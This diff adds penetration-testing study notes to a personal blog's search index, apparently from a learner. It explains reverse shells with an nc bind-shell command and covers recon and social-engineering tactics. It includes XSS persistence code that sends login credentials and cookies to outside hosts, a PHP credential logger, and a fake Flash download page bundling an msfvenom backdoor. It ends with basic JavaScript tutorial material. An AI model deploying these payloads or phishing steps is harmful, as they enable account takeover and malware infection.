@@ -140,8 +140,69 @@
 <p>windows：powershell、certutil等</p>
 <p>根据内置的下载命令，如果有一个漏洞是命令执行漏洞，那就可以通过该漏洞在目标机下载木马、反弹shell</p>
 <p><strong>反弹shell的正向连接、反向连接</strong></p>
-<p>对一个PC A来讲，<strong>它去监听一个端口，B通过端口去访问A，A监听到了</strong>，这叫正向</p>
-<p>对一个PC A来讲，如果A有了防火墙，A监听一个端口，B通过这个端口访问A，B访问不了，A也监听不到了，因为A的入站规则屏蔽了B；</p>
+<p>已知PC A，和PC B(有防火墙)</p>
+<p><strong>A去监听一个端口，B通过端口去访问A(公网地址)，A监听到了</strong></p>
+<p>对一个PC A来讲，<strong>它监听B的连接</strong>，这叫<strong>反向</strong></p>
+<blockquote>
+<p>A守株待兔，被动一方，对A来讲，这是一个反向连接</p>
+<p>比如，攻击者发现目标机有防火墙，或者目标机在内网，或目标机ip动态变化时用</p>
+</blockquote>
+<p>对一个PC B来讲，<strong>它主动通过端口访问A</strong>，这个行为，叫<strong>正向</strong></p>
+<blockquote>
+<p>B投怀送抱，主动一方，对B来讲，这是一个正向连接</p>
+<p>比如，ssh、远程桌面连接，这叫正向连接</p>
+</blockquote>
+<p>如果A有了防火墙，A监听一个端口，B通过这个端口访问A，B访问不了，A也监听不到了，因为A的入站规则屏蔽了B；</p>
+<p><strong>为什么要正向&#x2F;反向连接？</strong></p>
+<p>定义一个C(客户端)和一个S(服务端)，</p>
+<p>所谓正向连接，该连接就是要将 <strong>S能看到的东西，我C要主动去看</strong></p>
+<p>所谓反向连接，该连接就是要将 <strong>S能看到的东西，我等着让S给我看</strong></p>
+<p>反正所谓正向&#x2F;反向，是看你从A看，还是从B看；</p>
+<p>对于攻击者来说，只要它是<strong>正向连接的发起者</strong>，是<strong>反向连接的接收者</strong>即可</p>
+<p><strong>弹shell</strong>的正向这个问题，其实这样理解，</p>
+<p>如果S，<code>nc -lvp 233 -e /bin/bash</code></p>
+<p>而C，<code>nc S的ip 233</code>，那么C就获得了S的权限，如果没有nc工具，要么想办法让S下载一个，要么用 <strong>bash反弹</strong></p>
+<p>例子就是：pikachu靶场的命令执行漏洞</p>
+<p>假设B有个这个漏洞，A可以访问B这个有漏洞的页面，对A来讲，步骤如下：</p>
+<ol>
+<li>在B下载一个nc.exe</li>
+<li>在A本机去监听一个端口</li>
+<li>在B用这个nc去访问A的端口</li>
+<li>A监听到了B的shell</li>
+</ol>
+<p>对A来讲这是个什么连接，<strong>反向</strong>哈。</p>
+<h3 id="常见隧道"><a href="#常见隧道" class="headerlink" title="常见隧道"></a>常见隧道</h3><p><strong>网络层</strong>：</p>
+<blockquote>
+<p>icmp隧道，一般用icmpsh工具去代替ping命令</p>
+<p>ipv6</p>
+<p>gre</p>
+</blockquote>
+<p><strong>传输层</strong>：</p>
+<blockquote>
+<p>TCP协议，nc监听</p>
+<p>端口转发，lcx工具(绕防火墙)</p>
+</blockquote>
+<p><strong>应用层</strong>：</p>
+<blockquote>
+<p>DNS隧道</p>
+</blockquote>
+<p><strong>总结</strong></p>
+<p>所以个人计算机还是要开启防火墙，即使公网ip泄露也较为安全</p>
+<p>内网访问内网，都是<strong>去建立隧道</strong>，比如ssh，远程桌面连接啊，vpn之类的。</p>
+<h2 id="公网ip？！"><a href="#公网ip？！" class="headerlink" title="公网ip？！"></a>公网ip？！</h2><p>PC之所以可以上网，是因为ISP给路由器一个公网ip，这个公网ip使得我们可以进入互联网。</p>
+<p>那建站的时候，买个域名，云服务器肯定也分配了一个公网ip，这两个公网ip怎么说？</p>
+<p>对于普通家庭来讲，ISP分配的公网ip是<strong>动态</strong>的，当你有联网需要才会给你从闲置的ip池中分配一个，不需要了就回收</p>
+<p>ISP有静态的，但这个就用于商业或者专业用户了。</p>
+<p>！！！自己用ISP分配的公网ip，自建了一个IIS服务器，且关闭了防火墙，为什么在自己的浏览器上访问该服务器时，无法访问？</p>
+<p><strong>答</strong>：一般不会这样搞，首先关闭防火墙不安全；其次，普通用户的公网ip是动态分配的，不稳定。</p>
+<p>首先思路要这样捋一下，给一个设置情形吧：</p>
+<p>内网ip为192.168.1.49，我如果搭建了一个网站，域名叫hao123.com。去百度输入ip，回车，呈现出来的一个ip叫171.x.x.x；这个叫做<strong>外网出口</strong>，由于NAT协议的关系，可以使得一个内网下的多台电脑，共享同一个<strong>外网出口</strong>。如果要别人去访问<strong>网站</strong>怎么办：进到路由器的管理页面，有一个功能叫做<strong>端口映射</strong>，输入自己的内网ip，192.168.1.49，内网端口为80(可能不让用)，外网端口为80，添加这种映射关系。</p>
+<p>对于攻击者来讲：访问hao123.com，DNS解析的ip地址为171.x.x.x。实际上架设的web服务器在192.168.1.49下。那攻击者去扫描的是171.x.x.x的端口协议，真实网站是192.168.1.49，所以攻击者扫不到。攻击者就会知道，实际的网络架构应该是什么样子了。</p>
+<p>补充：</p>
+<blockquote>
+<p>有公网ip：登录路由器后台进行端口映射</p>
+<p>无公网ip：内网穿透工具去将内网端口映射到公网上，通过公网访问内网 (常用，不需要公网ip)</p>
+</blockquote>
 ]]></content>
       <categories>
         <category>渗透</category>
@@ -150,6 +211,706 @@
       <tags>
         <tag>渗透</tag>
         <tag>网络</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>渗透思想</title>
+    <url>/2023/09/26/%E8%B8%A9%E7%82%B9/</url>
+    <content><![CDATA[<h1 id="渗透思想"><a href="#渗透思想" class="headerlink" title="渗透思想"></a>渗透思想</h1><h1 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h1><p>技术总是很多，更新也快，有的东西学一辈子也学不完；所以人要有所取舍。</p>
+<p>学习本身不重要，学习能力才重要，一个人的学习能力体现了他的学习程度。</p>
+<p>今天我学数学，明天我学语文，后天我峡谷出击，这些都属于学习；但如何快速适应这三种不同的学习对象，我需要有一个基本大纲，这玩意儿就是思想。所以还是从书籍中看看渗透思路吧，为了备忘，故做出以下记录，但是我尽量按照自己的话来讲，如果只是照搬，我直接粘一个链接就得了。所以由于有些个人理解，难免有不妥之处，望自行辨别。</p>
+<h1 id="0x01-踩点"><a href="#0x01-踩点" class="headerlink" title="0x01 踩点"></a>0x01 踩点</h1><p>这个就是信息收集的一部分，根据书中列举筛选了一些。</p>
+<p>内、外网都有：</p>
+<ol>
+<li><p>域名</p>
+<blockquote>
+<p>这个不用讲，也是为了访问网站；如果主站弄不了，找二级域名突破。</p>
+</blockquote>
+</li>
+<li><p>网络地址块和子网</p>
+<blockquote>
+<p>这个就是说域名破不了，或者说有CDN的时候，往往从真实ip入手，主ip不行，去C段扫描，找子ip。</p>
+</blockquote>
+</li>
+<li><p>该系统上运行的TCP、UDP服务</p>
+<blockquote>
+<p>这些协议，传输层，进程通信；</p>
+<p>这个服务怎么理解？</p>
+<p>首先，使用TCP协议的有：http(s)协议、ssh、ftp、smtp，对吧，多用于网站；然后其实游戏里，比如使用一个技能或功能，这个是靠tcp协议的，<strong>封包</strong>之后，可以重复发送，这就是外挂的知识了</p>
+<p>UDP的使用嘛：DNS比较常见； 其它的就是DHCP、VoIP</p>
+<p>上面这些协议对应的是什么，是端口，所以可以理解为端口即服务</p>
+</blockquote>
+</li>
+<li><p>系统体系结构</p>
+<blockquote>
+<p>这个应该是内网部分了，你比如看机器是不是x86，mimikatz工具使用的时候对不同结构有不同用法，有一个进程迁移的步骤，必须要x86的进程，先不细讲。</p>
+</blockquote>
+</li>
+<li><p>入侵检测系统、防火墙</p>
+<blockquote>
+<p>这个嘛，其实也相当于日志了，我之前用过一个工具叫wauzh，它就是开源的IDS，开启后，会记录一些操作，比如ssh的登录，数据库的连接等等</p>
+<p>防火墙也比较熟悉，要么是系统防火墙，就是对进站出站的ip限制</p>
+<p>还有应用层防火墙，那就是安全狗啊，D盾这种</p>
+</blockquote>
+</li>
+<li><p>远程访问</p>
+<blockquote>
+<p>一般是扫到这个端口3389，远程连接尝试一波</p>
+</blockquote>
+</li>
+</ol>
+<p>知己知彼，百战不殆。</p>
+<p><strong>在互联网上搜到的信息有</strong></p>
+<ol>
+<li><p>web网站</p>
+<blockquote>
+<p>你比如：</p>
+<p>f12源代码里的注释信息</p>
+<p>潜在文件、目录的爆破；但是工具的动静一般是很大的，在实战中还是要斟酌一下</p>
+<p>功能点的漏洞，比如sql，比如xss，比如越权，比如抓包的逻辑漏洞</p>
+</blockquote>
+</li>
+<li><p>相关组织</p>
+<blockquote>
+<p>也即是找合作伙伴的漏洞</p>
+<p>比如说，访问后台的时候，可能存在说透露这是用了哪一个cms框架，那直接去搜现有exp，可能是弱口令，可能是其它exp</p>
+<p>比如说，对合作伙伴<strong>社工</strong>，得到些目标机的信息</p>
+</blockquote>
+</li>
+<li><p>地理位置细节</p>
+<blockquote>
+<p>位置都有了，google earth直接找到地点，去社工；</p>
+<p>无线攻击等等</p>
+</blockquote>
+</li>
+<li><p>员工信息</p>
+<blockquote>
+<p>一般多个员工信息是有规律的，比如学号就是的，知道一个人的学号，就可以推断出其它的学号</p>
+<p>电话号呢，社工；人肉他常活动的网页或app，比如社交网站还是什么的</p>
+<p>对于邮箱啊、姓名啊、电话号码，要么组合式地作为密码，要么社工，去<strong>钓鱼</strong></p>
+</blockquote>
+<p>这个书记载了一些有趣的事，它说：</p>
+<blockquote>
+<p>1.冒充猎头，去获取员工的简历，它里面是有一些敏感信息的</p>
+<p>2.根据公司招聘信息的要求，推断公司安全状况，冒充求职者去询问公司问题</p>
+<p>3.对于员工个人pc进行监听，个人pc可能有远程访问公司的途径</p>
+<p>4.和被解雇员工聊聊天</p>
+</blockquote>
+</li>
+<li><p>企业的重大事件</p>
+<blockquote>
+<p>短时间大量增员，外包，裁员这种事，那利用这种空隙去社工？</p>
+</blockquote>
+</li>
+<li><p>历史记录</p>
+<blockquote>
+<p>书上说是已归档信息，但是我个人理解的话，就这样：</p>
+<p>1.一个网站使用了<strong>CDN</strong>，看它使用CDN之前的ip，一般是真实ip</p>
+<p>2.嘶，忘了</p>
+</blockquote>
+</li>
+<li><p>搜索引擎</p>
+<blockquote>
+<p>嗯，不解释；它有手工的，也有自动化的</p>
+</blockquote>
+</li>
+</ol>
+<p>上面一般都是必须公布的公众信息</p>
+<p>下面介绍了whois和dns查点</p>
+<p><strong>目的：</strong>所有曾经注册过的单位和个人的域注册信息和IP注册信息</p>
+<p><strong>域相关信息</strong></p>
+<p>以example.com为例，虽然whois有一站式查询，但具体的流程要知道：</p>
+<p>顶级域(注册机构)-&gt;注册商-&gt;注册人，这个叫whois查询的三R</p>
+<p>具体就是，.com域的官方注册机构是A，在A的站点上，用example.com查出该域名的注册商为</p>
+<p>http: &#x2F;&#x2F;w ww.B.com，再去该站点查询到example.com域名的注册人细节信息</p>
+<p>命令行查询就是这样的</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[bash]$ whois com –h whois.iana.org</span><br><span class="line">[bash]$ whois keyhole.com –h whois.verisign-grs.com</span><br><span class="line">[bash]$ whois keyhole.com –h whois.omnis.com</span><br></pre></td></tr></table></figure>
+
+<p>WHOIS查询结果中的记录创建时间和记录修改时间可以让我们推测出WHOIS信息的准确性</p>
+<p><strong>IP相关信息</strong></p>
+<p>这个一般是在安全日志中，对某个IP溯源时查的</p>
+<p><strong>DNS查询</strong></p>
+<p>主机名和ip间的映射</p>
+<p>它主要有一个问题在于区域传送，就是说备用服务器对主服务器的DNS信息进行拷贝，但由于配置问题，可能会把内部IP地址信息提供给因特网上不受信任的用户</p>
+<p>nslookup就是其中一个执行区域传送的工具，还有host命令，这里不细讲，以后用到了再查吧</p>
+<h1 id="0x02扫描"><a href="#0x02扫描" class="headerlink" title="0x02扫描"></a>0x02扫描</h1><p><strong>1.确定目标主机在线</strong></p>
+<p>arp主机发现</p>
+<blockquote>
+<p>arp，mac地址转化为ip地址，一般用于攻击者与目标机在同一局域网下；</p>
+<p>工具arp-scan&#x2F;nmap</p>
+</blockquote>
+<p>icmp主机发现</p>
+<blockquote>
+<p>ping命令、nmap</p>
+</blockquote>
+<p>TCP&#x2F;UDP主机发现</p>
+<blockquote>
+<p>nmap&#x2F;superscan，这个就是端口扫描了</p>
+</blockquote>
+<p><strong>防御ping</strong></p>
+<blockquote>
+<p>IDS，记录到日志里；</p>
+<p>防火墙工具</p>
+</blockquote>
+<p><strong>2.确定服务</strong></p>
+<p>即端口扫描，<strong>目的：</strong>tcp&#x2F;udp服务、系统类型、提供服务的应用程序版本</p>
+<p>namp，就不多说了</p>
+<p>防御端口扫描</p>
+<blockquote>
+<p>IDS，比如Snort</p>
+<p>防火墙</p>
+<p>端口禁用</p>
+</blockquote>
+<p><strong>3.操作系统类型</strong></p>
+<p>从现有端口猜测，一般linux系统端口有22端口，当然windows也有，还有445端口</p>
+<p>namp为什么可以探查到操作系统类型，源于一种技术叫做 <strong>协议栈指纹分析技术</strong>，这是因为厂家在编写协议栈的时候，要对特定的RFC文档规定做出不同解释。</p>
+<h1 id="0x03-查点"><a href="#0x03-查点" class="headerlink" title="0x03 查点"></a>0x03 查点</h1><p>搜集相应的漏洞poc、弱口令、错误的共享资源、已知漏洞的软件</p>
+]]></content>
+      <categories>
+        <category>《黑客大曝光》</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>js&amp;xss扩展</title>
+    <url>/2023/11/08/xsskuozhan/</url>
+    <content><![CDATA[<h1 id="其它xss"><a href="#其它xss" class="headerlink" title="其它xss"></a>其它xss</h1><h1 id="低版本IE-xss"><a href="#低版本IE-xss" class="headerlink" title="低版本IE-xss"></a>低版本IE-xss</h1><p><strong>uxss</strong></p>
+<p>利用的是客户端(浏览器)本身的漏洞</p>
+<p><strong>flash-xss</strong></p>
+<p>swf与js代码应用</p>
+<p>swf文件下载后反编译</p>
+<p><strong>PDFXSS</strong></p>
+<p>PDF动作添加-&gt;文件上传，获取直链，值链被访问时触发</p>
+<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><h2 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h2><h3 id="1-后台植入cookie-x2F-表单劫持"><a href="#1-后台植入cookie-x2F-表单劫持" class="headerlink" title="1.后台植入cookie&#x2F;表单劫持"></a>1.后台植入cookie&#x2F;表单劫持</h3><p>条件：<strong>取得相关web权限后</strong>(不是黑盒测试了)</p>
+<p>1.写入代码到<strong>登录成功文件</strong>(写到源码里，如index.php的头部或尾部来一个&lt;script&gt;)，利用beef或xss平台实时监控<strong>cookie</strong></p>
+<p>2.同源策略或其他防护条件下，使用<strong>表单劫持</strong>或<strong>明文传输实现</strong></p>
+<p>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://jieshou.com/get.php?user=账号&amp;pass=密码&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">#对于php这样写，将下列语句插入到登录的php文件中</span><br><span class="line">$x=&#x27;&lt;script src=http://jieshou.com/get.php?user=&#x27;.$admin_name.&#x27;&amp;pass=&#x27;.$admin_pass.&#x27;&gt;&lt;/script&gt;&#x27;;</span><br><span class="line">echo $x;</span><br><span class="line">或者</span><br><span class="line">windows.location.href=...</span><br></pre></td></tr></table></figure>
+
+<p>服务器准备一个接收文件get.php，传参可以是cookie可以是账号等，内容为</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$myfile</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;newfile.txt&quot;</span>,<span class="string">&quot;w+ &quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$u</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$p</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-flash钓鱼页-msf"><a href="#2-flash钓鱼页-msf" class="headerlink" title="2.flash钓鱼页+msf"></a>2.flash钓鱼页+msf</h3><p>仿造的一个下载flash软件的页面</p>
+<p>将该页面文件，即index.html中添加为</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>立即下载<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://attacker.com/flash_install.exe&quot;</span> <span class="attr">target</span>=<span class="string">_self</span>&gt;</span>立即下载<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当然，这个exe是正版的，真正有猫腻的在于捆绑部分</p>
+<p>用<code>msfvenom</code> 生成一个后门exe叫做 flash.exe</p>
+<p>将正版安装包和flash.exe下到一起后，用rar打包</p>
+<p><img src="/../../../Typora/img111/image-20231109113742289.png" alt="设置解压路径为绝对路径"></p>
+<p><img src="/../../../Typora/img111/image-20231109113819590.png" alt="设置好路径+软件名"></p>
+<p>攻击的时候可以来一个html页面，去诱导它升级flash，对方点击确认后，跳转到假的flash页面</p>
+<p>受害者下载后，攻击者这边就可以msf监听</p>
+<h3 id="3-xss-浏览器网马配合msf访问上线"><a href="#3-xss-浏览器网马配合msf访问上线" class="headerlink" title="3.xss-浏览器网马配合msf访问上线"></a>3.xss-浏览器网马配合msf访问上线</h3><p>条件：beef上线受控后直接钓鱼(浏览器存在0day)</p>
+<p>1.配置msf生成url</p>
+<p>msf生成一个网马</p>
+<p>2.诱导受害者访问</p>
+<h2 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h2><p>当我注册登录一个页面后，有查看其他用户的账号和密码的页面，记为页A，但提示说不是 <strong>管理员</strong>，无法查看</p>
+<p>可以利用存储性xss，将xss插入到密码中</p>
+<p>注册一个账号，密码为：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;windows.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://121.121.121.121/get.php?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个是为了将<strong>管理员</strong>的<strong>cookie</strong>传参到攻击者的一个接收cookie的文件上，一旦管理员登录，就可以接收到它的cookie</p>
+<p>攻击者刷新 <strong>页A</strong>，然后替换cookie，达到查看目的</p>
+<p><strong>防御：Cookie凭据失效处理，如一次性</strong></p>
+<p>这个时候用 <strong>js获取表单</strong>，密码为一个获取当前页面内容的js，当管理员访问的时候，将该页面内容返回回来</p>
+<p>xss接收平台，将后台页面的内容直接获取</p>
+<h2 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h2><p>后台管理员有功能页面，查看注册用户的账号和密码</p>
+<p>其中有一个修改的密码，（抓包分析，需要用户登录状态），通过访问一个地址即可修改密码</p>
+<p>攻击：注册一个用户名和密码存在跳转修改密码的URL地址链接，当管理员登录后台，查看了用户的注册密码信息，就可以尝试重置密码</p>
+<p>你比如将用户名设置为：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;windows.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://127.0.0.1/api/change.php?p=123&#x27;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这样登录的话，没准可以admin，123登录成功</p>
+<p>对于用户管理页面，抓个包，拦截一下，没准就可以看到信息</p>
+<h2 id="例子3-post"><a href="#例子3-post" class="headerlink" title="例子3-post"></a>例子3-post</h2><p>如果对于表单是post请求的话</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;http://127.0.0.1/api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span class="string">&#x27;123&#x27;</span>&#125;&#125;);</span><br></pre></td></tr></table></figure>
+
+<h1 id="js"><a href="#js" class="headerlink" title="js"></a>js</h1><p>javascript</p>
+<p><strong>干什么</strong></p>
+<ol>
+<li>为网站提供交互功能</li>
+<li>构建web或者移动端应用</li>
+<li>开发一个命令行工具</li>
+</ol>
+<p><strong>工具</strong></p>
+<p>vscode、chrom</p>
+<p>vscode扩展：</p>
+<p>​	live server：每次保存js都会实时更新浏览器的一些变化</p>
+<h2 id="1-开始"><a href="#1-开始" class="headerlink" title="1.开始"></a>1.开始</h2><p>创建三个文件，js、html、css</p>
+<p>在html下</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span>&gt;</span> <span class="comment">&lt;!--link css文件--&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;index.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="comment">&lt;!--link js文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-变量-显示"><a href="#2-变量-显示" class="headerlink" title="2.变量+显示"></a>2.变量+显示</h2><ol>
+<li><strong>Declaration</strong>：(var，let，const)</li>
+<li><strong>Assignment</strong>：(* assignment operator)</li>
+</ol>
+<p>看一下js的效果</p>
+<p><img src="/../../../Typora/img111/image-20231109150100323.png"></p>
+<p>这只是控制台输出，那怎么输出到网页中去呢？</p>
+<p>首先html定义三个字段</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;p1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;p2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;p3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;index.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>js中添加</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p1&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;my age is &quot;</span>+age;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p2&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;i am a student? &quot;</span>+stu</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;p3&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;my name is &quot;</span>+name;</span><br></pre></td></tr></table></figure>
+
+<p>效果</p>
+<p><img src="/../../../Typora/img111/image-20231109150410390.png" alt="js显示于html"></p>
+<h2 id="3-运算符"><a href="#3-运算符" class="headerlink" title="3.运算符"></a>3.运算符</h2><p><strong>+,-,*,&#x2F;,%</strong></p>
+<p>类似于所学的语言了，不解释了</p>
+<h2 id="4-输入"><a href="#4-输入" class="headerlink" title="4.输入"></a>4.输入</h2><p><strong>法一</strong>：<strong>window.prompt</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> username=<span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&quot;psz input your name?&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br></pre></td></tr></table></figure>
+
+<p>效果</p>
+<p><img src="/../../../Typora/img111/image-20231109151039368.png" alt="image-20231109151039368"></p>
+<p><strong>法二</strong>: html text box</p>
+<p>在html下</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">id</span>=<span class="string">&quot;mylabel&quot;</span>&gt;</span>ENter your name!<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myinput&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;subbmit&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231109151802254.png" alt="提交"></p>
+<p>在js下添加点击事件</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;subbmit&quot;</span>).<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    username=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myinput&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br><span class="line">    <span class="comment">//顺便更改标签的值</span></span><br><span class="line">     <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mylabel&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;Hello! &quot;</span>+username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231109151945851.png" alt="改变label"></p>
+<h2 id="5-类型转换"><a href="#5-类型转换" class="headerlink" title="5.类型转换"></a>5.类型转换</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> x,y,z;</span><br><span class="line">x=<span class="title class_">Number</span>(<span class="number">3.14</span>);</span><br><span class="line">y=<span class="title class_">String</span>(<span class="number">3.14</span>);</span><br><span class="line">z=<span class="title class_">Boolean</span>(<span class="string">&quot;Yuleiyun&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x,<span class="keyword">typeof</span> x); <span class="comment">//3.14 &#x27;number&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(y,<span class="keyword">typeof</span> y); <span class="comment">//3.14 string</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(z,<span class="keyword">typeof</span> z); <span class="comment">//true &#x27;boolean&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="6-常量"><a href="#6-常量" class="headerlink" title="6.常量"></a>6.常量</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> pi=<span class="number">123</span>;</span><br><span class="line">pi=<span class="number">2323</span>;<span class="comment">//会报错</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(pi);</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-数学运算符"><a href="#7-数学运算符" class="headerlink" title="7.数学运算符"></a>7.数学运算符</h2><p>pow()，round()、ceil()、floor()用到再说</p>
+<h2 id="8-计数机制"><a href="#8-计数机制" class="headerlink" title="8.计数机制"></a>8.计数机制</h2><p>html</p>
